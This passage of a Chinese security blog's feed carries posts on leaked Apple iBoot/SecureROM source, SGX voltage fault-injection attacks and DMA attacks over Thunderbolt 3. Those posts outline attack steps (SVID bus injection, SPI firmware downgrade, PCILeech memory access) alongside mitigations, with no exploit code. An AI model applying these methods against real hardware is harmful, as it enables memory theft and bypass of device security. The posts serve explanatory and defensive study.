Makefile</span><br><span class="line">├── apps</span><br><span class="line">│   ├── EmbeddedIOP</span><br><span class="line">│   ├── SecureROM</span><br><span class="line">│   └── iBoot</span><br><span class="line">├── arch</span><br><span class="line">│   ├── arm</span><br><span class="line">│   └── arm64</span><br></pre></td></tr></table></figure><p>原来泄露的不只有iBoot，还有SecureROM！其实认真看苹果源码泄露事件的国外报道：<a href="https://www.iphonefirmware.com/breakthrough-iboot-and-securerom-source-code-has-leaked-could-lead-to-permanent-bootrom-iphone-jailbreak/">Breakthrough: iBoot And SecureROM Source Code Has Leaked, Could Lead To Permanent Bootrom iPhone Jailbreak</a>，他们是明确说了iBoot和SecureROM（也就是BootROM）的代码都泄露了，只不过是国内的媒体都只说了iBoot。接下来就是优秀源码阅读时间，不过无论是iBoot还是SecureROM，都是那种天地初开之时的底层代码。对于陌生的代码，可以从代码的运行顺序，目录结构，编译方法，文档说明，对比同类代码，以及他人的分析文章等方面综合理解。</p><ul><li><a href="https://www.reddit.com/r/jailbreak/comments/7vrl1q/discussion_iboot_source_code_leaked/">Discussion: iBoot Source Code Leaked</a></li><li><a href="https://blog.xinoassassin.me/2018/02/what-iboot-source-code-contains/">泄露的 iBoot 源代码中都有些什么</a></li><li><a href="https://beta.4hou.com/technology/13937.html">如何构建iBoot？</a></li><li><a href="https://nyansatan.github.io/building-iboot/">Building iBoot</a></li></ul><h2 id="0x05-调试"><a href="#0x05-调试" class="headerlink" title="0x05 调试"></a>0x05 调试</h2><p>JTAG相关</p><ul><li><a href="http://newosxbook.com/bonus/iBoot.pdf">iBoot</a></li><li><a href="https://www.youtube.com/watch?v=-ziD74n9lr4">SEPROM dump</a></li><li><a href="https://threader.app/thread/1177856941139337216">https://threader.app/thread/1177856941139337216</a></li><li><a href="https://twitter.com/nyan_satan/status/1090989650280398849">https://twitter.com/nyan_satan/status/1090989650280398849</a></li><li><a href="https://youtu.be/3zpwSUXlz6A">YouTube: iPhone 7平台用checkm8漏洞以及Bonobo JTAG电缆和OpenOCD + GDB进行调试</a></li></ul><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="https://checkm8.info/blog/jailbreak-mac-apple-t2-chip">https://checkm8.info/blog/jailbreak-mac-apple-t2-chip</a></p><p><a href="https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/#">https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/#</a><br><a href="https://ironpeak.be/blog/crouching-t2-hidden-danger/">https://ironpeak.be/blog/crouching-t2-hidden-danger/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先放一张图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215144432769.png&quot; alt=&quot;image-20201215144432769&quot;&gt;&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="Apple T2" scheme="http://www.ol4three.com/tags/Apple-T2/"/>
    
  </entry>
  
  <entry>
    <title>SGX攻击浅谈</title>
    <link href="http://www.ol4three.com/2020/12/01/IOT/SGX%E6%94%BB%E5%87%BB%E6%B5%85%E8%B0%88/"/>
    <id>http://www.ol4three.com/2020/12/01/IOT/SGX%E6%94%BB%E5%87%BB%E6%B5%85%E8%B0%88/</id>
    <published>2020-12-01T10:06:59.000Z</published>
    <updated>2020-12-03T11:55:34.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Base-SGX-Attack"><a href="#Base-SGX-Attack" class="headerlink" title="Base-SGX-Attack"></a>Base-SGX-Attack</h1><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/Intel-SGX-enclave.jpg" alt="SgxPectre attack allows to reveal the content of the SGX enclaveSecurity  Affairs"></p><h2 id="0x00-起源研究"><a href="#0x00-起源研究" class="headerlink" title="0x00 起源研究"></a>0x00 起源研究</h2><h3 id="1-VOLTpwn（software-based）"><a href="#1-VOLTpwn（software-based）" class="headerlink" title="1.VOLTpwn（software-based）"></a>1.VOLTpwn（software-based）</h3><h4 id="a-介绍"><a href="#a-介绍" class="headerlink" title="a.介绍"></a>a.介绍</h4><blockquote><p>VOLTpwn(CVE-2019-11157)是通过Intel处理器提供的用于控制CPU电压的软件接口MSR（Model Specific Register）0x150 来实现基于电压的故障注入</p></blockquote><p>#目前为止未公布POC代码</p><h4 id="a-危害"><a href="#a-危害" class="headerlink" title="a.危害"></a>a.危害</h4><p>​        通过恶意软件可以使用此接口将处理器电压降低到一个临界阀值，在该阀值下某些指令将无法正常运行。这意味着攻击者能够在使用这些指令实现的计算机中实现的计算中引起位翻转。因此攻击者能够操纵密码计算，甚至偏离程序的控制流程</p><h4 id="b-局限性"><a href="#b-局限性" class="headerlink" title="b.局限性"></a>b.局限性</h4><p>​        由于攻击是由软件控制的，因此攻击者不需要物理访问计算机。但是，攻击者需要操作系统特权才能使用电压接口。这意味着该漏洞并不直接威胁普通用户。主要目标是受信任的执行环境，例如intel sgx</p><h4 id="c-如何修复"><a href="#c-如何修复" class="headerlink" title="c.如何修复"></a>c.如何修复</h4><p>​        大部分用户用不到基于软件的电压调节接口，将intel 该接口禁用即可</p><h3 id="2-VoltPillager（Hardware-based）"><a href="#2-VoltPillager（Hardware-based）" class="headerlink" title="2.VoltPillager（Hardware-based）"></a>2.VoltPillager（Hardware-based）</h3><h4 id="a-介绍-1"><a href="#a-介绍-1" class="headerlink" title="a.介绍"></a>a.介绍</h4><blockquote><p>在VOLTpwn的基础上，针对intel将基于软件的电压调节禁用以缓解故障注入对SGX的影响，提出了使用硬件手段来进行攻击。</p></blockquote><h4 id="b-影响"><a href="#b-影响" class="headerlink" title="b.影响"></a>b.影响</h4><p>​        打破了公认的“SGX可以在硬件计算服务提供商是恶意的情况下保证用户数据和计算过程的安全性”这个前提</p><h2 id="0x01-Intel®-SGX"><a href="#0x01-Intel®-SGX" class="headerlink" title="0x01 Intel® SGX"></a>0x01 Intel® SGX</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><blockquote><p>Intel® Software Guard Extensions (Intel® SGX)保护选定的代码和数据不被泄露和修改。开发者可以把应用程序划分到CPU强化的encalve（飞地）中或者内存中可执行的保护区域，即使在受攻击的平台中也能提高安全性。</p></blockquote><h3 id="2-特性"><a href="#2-特性" class="headerlink" title="2.特性"></a>2.特性</h3><h4 id="a-机密性和完整性"><a href="#a-机密性和完整性" class="headerlink" title="a.机密性和完整性"></a>a.机密性和完整性</h4><p>​        即使在OS、BIOS、VMM或者SMM层存在特权恶意软件的情况下也能保证。</p><h4 id="b-低学习曲线"><a href="#b-低学习曲线" class="headerlink" title="b.低学习曲线"></a>b.低学习曲线</h4><p>​        和父类应用程序蕾丝的OS编程模型，并且在主CPU上执行。</p><h4 id="c-远程认证和提供"><a href="#c-远程认证和提供" class="headerlink" title="c.远程认证和提供"></a>c.远程认证和提供</h4><p>​        远程部分能够认证一个应用程序enclave的身份，并且安全地将密钥、凭据和敏感数据提供给enclave</p><h4 id="d-最小可能的攻击面"><a href="#d-最小可能的攻击面" class="headerlink" title="d.最小可能的攻击面"></a>d.最小可能的攻击面</h4><p>​        CPU边界成为攻击面外围，所有数据、内存、外围之外的I/O都是加密的。</p><h3 id="3-解决的问题"><a href="#3-解决的问题" class="headerlink" title="3.解决的问题"></a>3.解决的问题</h3><h4 id="传统应用程序的的约束"><a href="#传统应用程序的的约束" class="headerlink" title="传统应用程序的的约束"></a>传统应用程序的的约束</h4><p>​        开发者长期以来受到主要平台提供商暴露给应用开发的安全能力的限制。黑客也一样熟悉这些功能，他们能够利用弱点来加密敏感数据、凭据或者劫持代码来进行攻击。开发者必须依赖提供商的安全架构，在平台发布之后，他们没有能力设计一个符合他们需求的安全模型。</p><h3 id="4-提供新的方法"><a href="#4-提供新的方法" class="headerlink" title="4.提供新的方法"></a>4.提供新的方法</h3><p>​        Intel设计了一个可能具有最小攻击面的硬件辅助的可信执行环境：CPU边界。Intel SGX提供了17种新的Intel®架构指令，应用程序可以用来为代码和数据设置保留的私有区域，也能够阻止对执行中代码和内存中数据进行的直接攻击。</p><h4 id="开发intel-SGX保护的应用程序"><a href="#开发intel-SGX保护的应用程序" class="headerlink" title="开发intel SGX保护的应用程序"></a>开发intel SGX保护的应用程序</h4><h5 id="a-组成"><a href="#a-组成" class="headerlink" title="a.组成"></a>a.组成</h5><ul><li>不可信代码</li><li>可信代码enclave(可以被安全调用)</li></ul><h5 id="b-运行流程"><a href="#b-运行流程" class="headerlink" title="b.运行流程"></a>b.运行流程</h5><ul><li>1.App由可信和不可信部分构成</li><li>2.App运行和穿件enclave，enclave放入可信内存中</li><li>3.可信函数被调用，执行会转换到enclave中</li><li>4.enclave可以访问所有进程数据，外部要访问encalve数据被禁止</li><li>5.可信函数返回enclave数据</li><li>6.App进行执行不同代码</li></ul><h5 id="c-认证enclave和加密数据"><a href="#c-认证enclave和加密数据" class="headerlink" title="c.认证enclave和加密数据"></a>c.认证enclave和加密数据</h5><ul><li><p>intel SGX使用enclave之间本地认证或者第三方认证的方式来保证应用程序没有收到破坏</p><h6 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h6><ul><li>1.intel SGX通过指令生成CPU和enclave特定的密封密钥</li><li>2.应用程序受保护的部分会被加载到一个enclave</li><li>3.对应的代码和数据都会受到测量</li><li>4.将对应的报告发送给远端应用程序拥有着的服务器上</li><li>5.验证这个enclave报告是不是一个可靠的intel处理器生成的</li><li>6.验证成功远端信任并安全的提供密钥、凭证和数据</li></ul></li></ul><h5 id="d-可能存在的攻击面"><a href="#d-可能存在的攻击面" class="headerlink" title="d.可能存在的攻击面"></a>d.可能存在的攻击面</h5><ul><li>对enclave未授权访问</li><li>对enclave内存侦听</li></ul><h3 id="5-实现新的安全模型和创新"><a href="#5-实现新的安全模型和创新" class="headerlink" title="5.实现新的安全模型和创新"></a>5.实现新的安全模型和创新</h3><h4 id="intel-SGX使用案例"><a href="#intel-SGX使用案例" class="headerlink" title="intel SGX使用案例"></a>intel SGX使用案例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">保护应用程序和数据Tamper-resistant code tool vendors</span><br><span class="line"></span><br><span class="line">保护支付对话以及云和数据安全Financial services industry (FSI) companies</span><br><span class="line"></span><br><span class="line">加强生物识别; 强化认证Security authentication companies</span><br><span class="line"></span><br><span class="line">强化浏览器体验Browser vendors</span><br><span class="line"></span><br><span class="line">强化DRM，增强高清，4K超高清（UHD）内容保护Content playback ISVs and content owners across over-the-top (OTT) and media services</span><br><span class="line"></span><br><span class="line">加强终端安全性Security ISVs and OEMs</span><br><span class="line"></span><br><span class="line">保护通信-终端到管理控制台Security ISVs</span><br><span class="line"></span><br><span class="line">保护电子病历（EMR），敏感和机密数据Governments and major health care organizations</span><br><span class="line"></span><br><span class="line">保护本地文件系统上的密钥; 强化磁盘保护Disk encryption ISVs</span><br><span class="line"></span><br><span class="line">保护密钥管理，优化嵌入式应用程序Cloud, infrastructure, and SaaS providers</span><br><span class="line"></span><br><span class="line">保护TLS密钥库管理Cloud, content delivery networks, frequency scanning interferometry (FSI), infrastructure, SaaS</span><br><span class="line"></span><br><span class="line">安全的分析工作负载Big data ISVs and enterprises</span><br><span class="line"></span><br><span class="line">安全的文档共享和查看Government and secure document sharing ISVs</span><br><span class="line"></span><br><span class="line">飞地优化的嵌入式应用程序Major defense contractors</span><br><span class="line"></span><br><span class="line">安全的IoT边界设备和云通信IoT gateway and device manufacturers</span><br></pre></td></tr></table></figure><h2 id="0x02实验准备"><a href="#0x02实验准备" class="headerlink" title="0x02实验准备"></a>0x02实验准备</h2><h4 id="1-System"><a href="#1-System" class="headerlink" title="1.System"></a>1.System</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- 1.Ubuntu 18.04.3 LTS 64-bit</span><br><span class="line">- 2.Kernel 5.0.0-23-generic</span><br><span class="line">- 3.Intel SGX driver V2.6</span><br><span class="line"></span><br><span class="line">  - https:&#x2F;&#x2F;github.com&#x2F;intel&#x2F;linux-sgx-driver</span><br><span class="line"></span><br><span class="line">- 4.IntelSGX-SDK V 2.8</span><br><span class="line"></span><br><span class="line">  - https:&#x2F;&#x2F;github.com&#x2F;intel&#x2F;linux-sgx</span><br></pre></td></tr></table></figure><h4 id="2-Others"><a href="#2-Others" class="headerlink" title="2.Others"></a>2.Others</h4><p>1.Teensy 4.0 Development Board（350¥）</p><p>2 *Bus Driver，you can choose between the following</p><ul><li><p>b.SN74LVC1G07DRLR（7¥）</p></li><li><p>a.NL17SZ07XV5T2G（1-3¥）</p></li></ul><p>3.SOT IC Adapter（172¥）</p><h2 id="0x03攻击方式"><a href="#0x03攻击方式" class="headerlink" title="0x03攻击方式"></a>0x03攻击方式</h2><h3 id="1-选择明文攻击差分攻击获取AES密钥"><a href="#1-选择明文攻击差分攻击获取AES密钥" class="headerlink" title="1.选择明文攻击差分攻击获取AES密钥"></a>1.选择明文攻击差分攻击获取AES密钥</h3><h3 id="2-延迟写攻击"><a href="#2-延迟写攻击" class="headerlink" title="2.延迟写攻击"></a>2.延迟写攻击</h3><p>​        作者发现在拉低电压的情况下会出现写操作延迟，流水线调度出现问题，造成结果错误的问题。</p><p>eg：流水线已经执行下一条数据相关的指令但是上段流水的写操作尚未完成，导致计算出错，理论上可以用于绕过密码判断等，也可以造成数据写越界</p><h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3.攻击步骤"></a>3.攻击步骤</h3><p>1.找到主板上的SVID和电压调节器(VR)</p><p>2.通过tenssy和其他的工具，并接在SVID总线上，以进行指令注入</p><p>3.执行基于电压的故障注入攻击</p><h2 id="0x04-缓解方式"><a href="#0x04-缓解方式" class="headerlink" title="0x04 缓解方式"></a>0x04 缓解方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.重新设计协议，增加SVID协议的密码认证</span><br><span class="line"></span><br><span class="line">2.CPU监视总线上的数据包，检测注入的SVID数据包，如果非自己发出的数据包CPU可能依法异常并中止执行</span><br><span class="line"></span><br><span class="line">- 攻击者可以在CPU和VR间充当中间人，隐藏恶意的数据包</span><br><span class="line"></span><br><span class="line">3.检测自身电源电压，如果电压低于以下的值则终止，电压监控电路</span><br><span class="line"></span><br><span class="line">- 不能依赖基于测量CPU电压的缓解措施，SGX不提供信任的方式来访问MSR，因此此类对策都可以通过有问题的操作系统</span><br><span class="line"></span><br><span class="line">4.检测在运行内核上的多个关键代码路径</span><br><span class="line"></span><br><span class="line">- 这种对此对策大量的硬件更改并产生开销</span><br><span class="line"></span><br><span class="line">5.使用完全集成的稳压器（FIVR）</span><br><span class="line"></span><br><span class="line">- 第4代Intel Core SoC（已废弃）</span><br></pre></td></tr></table></figure><h2 id="0x05参考链接"><a href="#0x05参考链接" class="headerlink" title="0x05参考链接"></a>0x05参考链接</h2><p><a href="https://www.usenix.org/system/files/sec21summer_chen-zitai.pdf">https://www.usenix.org/system/files/sec21summer_chen-zitai.pdf</a></p><p><a href="https://zhuanlan.zhihu.com/p/39976702">https://zhuanlan.zhihu.com/p/39976702</a></p><p><a href="https://www.youtube.com/watch?v=5Mr1FCZ7VBQ">https://www.youtube.com/watch?v=5Mr1FCZ7VBQ</a></p><p><a href="https://github.com/intel/linux-sgx-driver">https://github.com/intel/linux-sgx-driver</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Base-SGX-Attack&quot;&gt;&lt;a href=&quot;#Base-SGX-Attack&quot; class=&quot;headerlink&quot; title=&quot;Base-SGX-Attack&quot;&gt;&lt;/a&gt;Base-SGX-Attack&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="SGX" scheme="http://www.ol4three.com/tags/SGX/"/>
    
  </entry>
  
  <entry>
    <title>DMA攻击和Thunderbolt 3安全级别浅谈</title>
    <link href="http://www.ol4three.com/2020/11/28/IOT/DMA%E6%94%BB%E5%87%BB%E5%92%8CThunderbolt-3%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E6%B5%85%E8%B0%88/"/>
    <id>http://www.ol4three.com/2020/11/28/IOT/DMA%E6%94%BB%E5%87%BB%E5%92%8CThunderbolt-3%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E6%B5%85%E8%B0%88/</id>
    <published>2020-11-28T02:56:23.000Z</published>
    <updated>2020-12-03T12:10:48.627Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/DVhR_cLWsAA52bB.jpg" alt="Overview of DMA attacks"></p><h2 id="0x00-DMA攻击"><a href="#0x00-DMA攻击" class="headerlink" title="0x00 DMA攻击"></a>0x00 DMA攻击</h2><blockquote><p>​    DMA攻击是一种侧信道攻击，即攻击者可以通过利用高速扩展端口，穿透计算机和操作系统，直接读取DMA，DMA包含在许多连接中，DMA可以通过例如便携式摄像机、网卡、存储设备或者其他可直接读取或写入主内存的互动设备。此类设备的合法使用已导致DMA连接广泛，攻击者可以采用工具连接到DMA接口，绕过操作系统的安全机制和屏幕密码等，来访问部分或者全部的计算机物理内存地址，读取计算机的所有工作，窃取数据和加密密钥，安装运行间谍软件和其他漏洞利用程序，或者修改系统以允许后门或其他恶意软件</p></blockquote><p>允许DMA攻击的设备包括：FireWire、CardBus、ExpressCard、Thunderbolt、PCI和PCI Express</p><h2 id="0x01-DMA-是什么"><a href="#0x01-DMA-是什么" class="headerlink" title="0x01 DMA 是什么"></a>0x01 DMA 是什么</h2><blockquote><p>DMA(Direct Memory Access，直接存储器访问) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。否则，CPU 需要从来源把每一片段的资料复制到暂存器，然后把它们再次写回到新的地方。在这个时间中，CPU 对于其他的工作来说就无法使用。</p></blockquote><p>​    正常情况一般只有CPU才能进入主存，现在加了DMA，直接在I/O设备和主存之间打通了一个通路，用来减少CPU的负担。如果出现DMA和CPU同时访存的情况，DMA优先级更高，当两者争抢时CPU是DMA的小弟卧槽 好家伙我TM直接好家伙。</p><p>那么CPU和DMA同时访问主存就会出现一下三种情况：</p><h3 id><a href="#" class="headerlink" title></a></h3><p>​    <strong>1.CPU停止访问主存</strong></p><p>​            a.CPU放弃地址线的使用权<br>​            b.CPU放弃数据线的使用权<br>​            c.CPU放弃控制线的使用权</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203193831422.png" alt="image-20201203193831422"></p><p>优点: 控制简单，它适用于数据传输率很高的设备进行成组传送。</p><p>缺点: 在DMA控制器访问内存阶段，内存的效能没有充分发挥，相当一部分内存工作周期是空闲的。这是因为，外围设备传送两个数据之间的间隔一般总是大于内存存储周期，即使高速I/O设备也是如此。例如，软盘读出一个8位二进制数大约需要32us，而半导体内存的存储周期小于0.5us，因此许多空闲的存储周期不能被CPU利用。</p><p>​    <strong>2.周期挪用</strong></p><p>​    DMA请求时，I/O设备挪用或者窃取总线占用权一个或几个主存周期</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203193850311.png" alt="image-20201203193850311"></p><p>I/O设备要求DMA传送时可能遇到两种情况：</p><p>​            (1)此时CPU不需要访内，如CPU正在执行乘法指令。由于乘法指令执行时间较长，此时I/O访内与CPU访内没有冲突，即I/O设备挪用一二个内存周期对CPU执行程序没有任何影响。</p><p>​            (2)I/O设备要求访内时CPU也要求访内，这就产生了访内冲突，在这种情况下I/O设备访内优先，因为I/O访内有时间要求，前一个I/O数据必须在下一个访问请求到来之前存取完毕。显然，在这种情况下I/O 设备挪用一二个内存周期，意味着CPU延缓了对指令的执行，或者更明确地说，在CPU执行访内指令的过程中插入DMA请求，挪用了一二个内存周期。 与停止CPU访内的DMA方法比较，周期挪用的方法既实现了I/O传送，又较好地发挥了内存和CPU的效率，是一种广泛采用的方法。但是I/O设备每一次周期挪用都有申请总线控制权、建立线控制权和归还总线控制权的过程，所以传送一个字对内存来说要占用一个周期，但对DMA控制器来说一般要2—5个内存周期(视逻辑线路的延迟而定)。因此，周期挪用的方法适用于I/O设备读写周期大于内存存储周期的情况。</p><p>3.DMA和CPU交替访问</p><p>​            适用于CPU的工作周期比主存存取周期长的情况。这样可以将CPU的周期拆分成两部分，前一部分用于DMA访存，后一部分用于CPU访存</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203194201769.png" alt="image-20201203194201769"></p><p>​            这种传送方式又称为“透明的DMA”方式，其来由是这种DMA传送对CPU来说，如同透明的玻璃一般，没有任何感觉或影响。在透明的DMA方式下工作，CPU既不停止主程序的运行，也不进入等待状态，是一种高效率的工作方式。当然，相应的硬件逻辑也就更加复杂。</p><h2 id="0x03-Thunderbolt-3-安全等级"><a href="#0x03-Thunderbolt-3-安全等级" class="headerlink" title="0x03 Thunderbolt 3 安全等级"></a>0x03 Thunderbolt 3 安全等级</h2><p><strong>无安全性（SL0）</strong></p><blockquote><p>在位于SL0模式时，任何Thunderbolt 3设备连接后将立即开始工作。此模式的危险在于，由于Thunderbolt 3支持PCIe，并且PCIe允许直接访问系统内存，因此恶意的Thunderbolt 3设备可以访问系统内存中的潜在敏感数据，而在SL0模式下，只需要简单的插入设备。</p></blockquote><p><strong>用户授权（SL1）Default</strong></p><blockquote><p>连接Thunderbolt 3设备时，用户必须响应弹出对话框以明确允许连接。用户可以选择允许一次或始终允许该特定设备。这减轻了上述SL0风险。</p></blockquote><p><strong>安全连接（SL2）</strong></p><blockquote><p>与SL1相同，不同之处在于，如果用户选择始终允许特定设备，则系统会向该设备写入加密密钥，并将其记录在其自己的固件中，以执行更强大的“身份验证”使用质询/响应机制在后续连接上对该设备的性能进行评估。这样可以防止攻击者获取已被授予“始终允许”访问权限的外围设备的设备ID并将其克隆到恶意设备上，这在SL1模式下将允许该恶意设备获得“始终允许”访问权限。但是，并非所有的Thunderbolt 3外设都支持SL2。</p></blockquote><p><strong>仅DisplayPort和USB（SL3）</strong></p><blockquote><p>通过Thunderbolt 3允许DisplayPort流量，但不允许PCIe。</p><p>如果设置安全模式为SL3，并且连接到实际的Thunderbolt 3扩展坞，则将获得视频输出，但将无法使用通过扩展坞的USB控制器运行的任何USB 3.x端口或其他扩展坞功能。（通常包括所有其他端口，以太网，音频等）</p></blockquote><p><strong>Daisy chaining disabled / USB docks only (SL4)</strong></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4729ovyQtZWmVOd.png" alt="image-20200514221739727"></p><blockquote><p>SL4 会禁用thunderbolt菊花链，而不是DisplayPort菊花链。</p><p>在SL4模式下，允许设备使用PCIe，但仅允许链中的第一个Thunderbolt 3设备。链下游的thunderbolt设备将不允许使用PCIe。</p><p>此模式旨在防止恶意的Thunderbolt外围设备通过受信任的设备（例如扩展坞）来访问系统。</p></blockquote><p><strong>内核DMA保护</strong></p><blockquote><p>此模式需要系统固件，操作系统，驱动程序和Thunderbolt 3外围设备的支持。</p><p>内核DMA保护使系统仅允许外围设备直接访问系统内存的指定部分，从而降低了风险。</p><p>如果系统支持内核DMA保护，但所连接的特定Thunderbolt外围设备不支持它，则该系统将退回到该特定设备连接（通常为SL1）</p></blockquote><h2 id="0x04-攻击方式"><a href="#0x04-攻击方式" class="headerlink" title="0x04 攻击方式"></a>0x04 攻击方式</h2><ol><li><p>对于默认采用了SL1的设备，可以通过其主板上的SPI接口dump出Thunderbolt接口控制的固件，对固件进行修改并写回，以此将SL1降级为SL0。</p><p>p.s. 在对设备进行写SPI闪存进行降级的时候，可以将审批闪存设置为只读，这样用户就无法通过BIOS更改 Thunderbolt接口 的安全等级。</p></li><li><p>降级成功后通过Thunderbolt接口连接被攻击的设备，执行DMA攻击（PCILeech 攻击程序）</p><blockquote><p>PCILeech部分功能:</p><ul><li>可以通过&gt;150MB/s的速度检索内存</li><li>将数据写入目标内存</li><li>将活动的RAM挂载位文件</li><li>将文件系统挂载为驱动器</li><li>在目标系统上执行内核代码</li><li>解锁系统</li></ul></blockquote></li></ol><p>PCILeech攻击使用PCIe硬件设备读取和写入目标系统内存。这是通过在PCIe上使用DMA来实现的。目标系统上不需要驱动程序。</p><p>PCILeech还可以在没有硬件的情况下运行，并可以使用LeechCore库支持的多种软件内存获取方法-包括使用DumpIt或WinPmem捕获远程实时内存。PCILeech还支持本地捕获内存和多种内存转储文件格式。</p><p>支持多个内存采集器比如：</p><p>1.基于USB3380的硬件（基于USB3380的硬件只能本地读取4GB内存，但是如果首先将内核模块(KMD)插入目标系统内核，则可以读取所有内存。）<br>2.基于FPGA</p><p>支持的目标系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UEFI</span><br><span class="line">Linux</span><br><span class="line">FreeBSD</span><br><span class="line">macOS（不支持macOS High Sierra及更高版本）</span><br><span class="line">Windows</span><br></pre></td></tr></table></figure><p>​    这需要有内存（USB3380硬件，FPGA硬件或CVE-2018-1038“ Total Meltdown”）的写访问权。</p><h2 id="0x05-安全思考"><a href="#0x05-安全思考" class="headerlink" title="0x05 安全思考"></a>0x05 安全思考</h2><p>1.设备位于SL1模式下，是否可以 窃取\克隆 已经获得授权的设备ID，以此获得无提示的设备接入。<br>2.针对上一点作出防御的SL2模式，如果在THunderbolt 3外设不支持SL2的情况下会自动降级到SL1。攻击者完全可以随心所欲降级。SL2如果不是强制实施的话等于无效</p><h2 id="0x08-如何缓解"><a href="#0x08-如何缓解" class="headerlink" title="0x08 如何缓解"></a>0x08 如何缓解</h2><p>BIOS中启用VT-d(IOMMU)防护DMA攻击<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203195328413.png" alt="image-20201203195328413"></p><h2 id="0x09-参考链接"><a href="#0x09-参考链接" class="headerlink" title="0x09 参考链接"></a>0x09 参考链接</h2><p><a href="https://en.wikipedia.org/wiki/DMA_attack">https://en.wikipedia.org/wiki/DMA_attack</a><br><a href="https://baike.baidu.com/item/DMA/2385376">https://baike.baidu.com/item/DMA/2385376</a><br><a href="https://github.com/ufrisk/pcileech">https://github.com/ufrisk/pcileech</a><br><a href="https://www.anquanke.com/post/id/86840">https://www.anquanke.com/post/id/86840</a><br><a href="https://github.com/LuckyPi/PushPin">https://github.com/LuckyPi/PushPin</a><br><a href="https://www.youtube.com/watch?v=mca3rLsHuTA">https://www.youtube.com/watch?v=mca3rLsHuTA</a><br><a href="https://zhuanlan.zhihu.com/p/50640466">https://zhuanlan.zhihu.com/p/50640466</a><br><a href="https://docs.microsoft.com/zh-cn/windows/security/information-protection/kernel-dma-protection-for-thunderbolt">https://docs.microsoft.com/zh-cn/windows/security/information-protection/kernel-dma-protection-for-thunderbolt</a><br><a href="https://www.youtube.com/watch?v=7uvSZA1F9os">https://www.youtube.com/watch?v=7uvSZA1F9os</a><br><a href="https://www.youtube.com/watch?v=oEfzp4lHpB0">https://www.youtube.com/watch?v=oEfzp4lHpB0</a><br><a href="http://lordcasser.com/2020/07/01/thunderbolt/">http://lordcasser.com/2020/07/01/thunderbolt/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/DVhR_cLWsAA52bB.jpg&quot; alt=&quot;Overview of DMA attacks&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-DMA攻击&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="DMA" scheme="http://www.ol4three.com/tags/DMA/"/>
    
      <category term="Thunderbolt 3" scheme="http://www.ol4three.com/tags/Thunderbolt-3/"/>
    
  </entry>
  
  <entry>
    <title>使用Ubertooth one扫描嗅探低功耗蓝牙</title>
    <link href="http://www.ol4three.com/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/"/>
